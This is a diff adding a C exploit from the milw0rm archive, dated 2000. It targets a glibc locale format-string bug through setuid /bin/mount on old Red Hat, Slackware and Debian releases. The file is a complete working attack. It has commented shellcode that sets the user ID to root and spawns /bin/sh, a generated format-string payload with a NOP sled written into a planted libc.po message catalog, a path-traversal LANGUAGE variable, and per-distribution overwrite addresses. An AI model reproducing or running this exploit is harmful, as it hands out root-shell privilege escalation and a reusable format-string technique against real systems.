@@ -1,0 +1,169 @@
+/*
+ *                mount exploit for glibc locale bug 
+ *       tested on redhat 6.2 and slackware 7.0 and debian 2.2
+ *
+ *  Debian 2.2 (mount-2.10f)        : ./mnt -n 136 -a 0x080589a0 -i 192
+ *  Redhat 6.2 (mount-2.10f)        : ./mnt -n 114 -a 0x080565dc -i 112
+ *  compiled on rh 6.2 (mount-2.10m): ./mnt -n 114 -a 0x08059218 -i 112
+ *
+ *      "objdump /bin/mount | grep exit" to get the -a address
+ *
+ *                                                         - sk8
+ */
+
+#include <unistd.h>
+#include <stdio.h>
+#include <fcntl.h>
+
+char sc[]=
+  /* main: */                            /* setreuid(0, 0);          */
+  "\x29\xc0"                             /* subl %eax, %eax          */
+  "\xb0\x46"                             /* movb $70, %al            */
+  "\x29\xdb"                             /* subl %ebx, %ebx          */
+  "\xb3\x0c"                             /* movb $12, %bl            */
+  "\x80\xeb\x0c"                         /* subb $12, %bl */
+  "\x89\xd9"                             /* movl %ebx, %ecx          */
+  "\xcd\x80"                             /* int $0x80                */
+  "\xeb\x18"                             /* jmp callz                */
+
+  /* start: */                           /* execve of /bin/sh        */
+  "\x5e"                                 /* popl %esi                */
+  "\x29\xc0"                             /* subl %eax, %eax          */
+  "\x88\x46\x07"                         /* movb %al, 0x07(%esi)     */
+  "\x89\x46\x0c"                         /* movl %eax, 0x0c(%esi)    */
+  "\x89\x76\x08"                         /* movl %esi, 0x08(%esi)    */
+  "\xb0\x0b"                             /* movb $0x0b, %al          */
+  "\x87\xf3"                             /* xchgl %esi, %ebx         */
+  "\x8d\x4b\x08"                         /* leal 0x08(%ebx), %ecx    */
+  "\x8d\x53\x0c"                         /* leal 0x0c(%ebx), %edx    */
+  "\xcd\x80"                             /* int $0x80                */
+
+  /* callz: */
+  "\xe8\xe3\xff\xff\xff"                 /* call start               */
+
+  /* /bin/sh */
+  "\x2f\x62\x69\x6e\x2f\x73\x68";
+
+int main(int argc, char** argv) {
+  FILE* fp;
+  int numnops=10080;
+  char buffer[20000], fmtbuf[1000], numbuf[2000];
+  int shloc=0xbfffdaa0;
+  int i=0, c=0; 
+  char mode='n';
+  int debug=0;
+  int eiploc=0xbffffdc0;
+  char* envbuf[2];
+  int inc=112;
+  int epad=-1, bpad=0;
+  int s=0;  
+  int nump=114;
+  int num[4];
+  char xpath[128];
+  char* heapaddr=(char*)malloc(200);  
+  memset(xpath, 0, strlen(xpath));
+  memset(buffer, 0, sizeof(buffer));
+  memset(fmtbuf, 0, sizeof(fmtbuf));
+  memset(numbuf, 0, sizeof(numbuf));
+  printf("heapaddr: 0x%x\n", heapaddr);
+  c=0;
+  strcpy (xpath, "/bin/mount");
+
+  while ((s=getopt(argc, argv, "p:s:b:e:a:n:i:d")) != EOF) {
+    switch(s) {
+      case 's': shloc=strtoul(optarg, 0, 0); break;
+      case 'b': bpad=atoi(optarg); break;
+      case 'e': epad=atoi(optarg); break;
+      case 'a': eiploc=strtoul(optarg, 0, 0); break;
+      case 'n': nump=atoi(optarg); break;
+      case 'i': inc=atoi(optarg); break;
+      case 'p': strcpy(xpath, optarg); break;
+      case 'd': debug=1; break;
+      default: 
+    }
+  }
+
+  if (epad < 0) epad=10-strlen(xpath)%16;
+  if (epad < 0) epad+=16;
+
+  for (i=0; i < nump; i++) {
+    buffer[c++]='%';
+    buffer[c++]='8';
+    buffer[c++]='x';
+  }
+
+  if (debug) { mode='p';
+    strcpy(sc, "AAAA");
+    numnops=0;
+  }
+  printf("cur strlen: %i\n", strlen(buffer));
+
+  /* size of executed program (/bin/mount) does not seem to affect these calculations
+     it does affect location of eip however, (which is why its nice to just overwrite exit 
+     it also affects epadding, but that is calculated based on executed program size
+  */
+  num[0]=(shloc & 0xff)+inc; /* why 23? 114/4 - 5 */
+  if (num[0] < 0) num[0]+=256;
+  num[1]=((shloc >> 8) & 0xff)-(shloc & 0xff);
+  if (num[1] < 0) num[1]+=256;
+  num[2]=((shloc >> 16) & 0xff)+0x100-((shloc >> 8)&0xff);
+  if (num[2] < 0) num[2]+=256;
+  num[3]=((shloc >> 24) & 0xff)+1;
+  if (num[3] < 0) num[3]+=256;
+
+  sprintf(fmtbuf, "%%%id%%h%c%%%id%%h%c%%%id%%h%c%%%id%%h%c", num[0]
+    , mode, num[1], mode, num[2], mode, num[3], mode);
+  printf("fmtbuf: %s\n", fmtbuf);
+  printf("strlen(fmtbuf): %i\n", strlen(fmtbuf));
+  memcpy(buffer+strlen(buffer), fmtbuf, strlen(fmtbuf));
+
+  memset(buffer+strlen(buffer), 0x90, numnops);
+  memcpy(buffer+strlen(buffer), sc, strlen(sc));
+  
+  mkdir("/tmp/sk8", 0755);
+  mkdir("/tmp/sk8/LC_MESSAGES", 0755);
+  if ( ! (fp=fopen("/tmp/sk8/LC_MESSAGES/libc.po", "w") ) ) {
+    printf("could not create bad libc.po\n");
+    exit(-1);
+  }  
+  fprintf(fp, "msgid \"%%s: unrecognized option `--%%s'\\n\"\n");
+  fprintf(fp, "msgstr \"%s\\n\"", buffer);
+  fclose(fp);
+
+  system("msgfmt /tmp/sk8/LC_MESSAGES/libc.po -o /tmp/sk8/LC_MESSAGES/libc.mo");
+
+  c=0;
+  numbuf[c++]='-';
+  numbuf[c++]='-';
+  
+  memset(numbuf+strlen(numbuf), 'B', bpad);
+  
+  memcpy(numbuf+strlen(numbuf), "PPPP", 4);
+  *(long*)(numbuf+strlen(numbuf))=eiploc;
+
+  memcpy(numbuf+strlen(numbuf), "PPPP", 4);
+  *(long*)(numbuf+strlen(numbuf))=eiploc+1;
+
+  memcpy(numbuf+strlen(numbuf), "PPPP", 4);
+  *(long*)(numbuf+strlen(numbuf))=eiploc+2;
+
+  memcpy(numbuf+strlen(numbuf), "PPPP", 4);
+  *(long*)(numbuf+strlen(numbuf))=eiploc+3;
+  printf("cur numbuf length: %i\n", strlen(numbuf));
+  memset(numbuf+strlen(numbuf), 'Z', epad);
+  printf("cur numbuf length: %i\n", strlen(numbuf));
+
+  envbuf[0]="LANGUAGE=en_GB/../../../../tmp/sk8/";
+  envbuf[1]=0;
+
+  printf("strlen(numbuf): %i\n", strlen(numbuf));
+  printf("bpad: %i; epad: %i\n", bpad, epad);  
+  printf("number of %%p's to traverse stack: %i\n", nump);
+  printf("address of eip: 0x%x\n", eiploc);
+  printf("inc: %i\n", inc);
+
+  execle(xpath, "mount", numbuf, 0, envbuf);  
+}
+
+
+// milw0rm.com [2000-12-02]
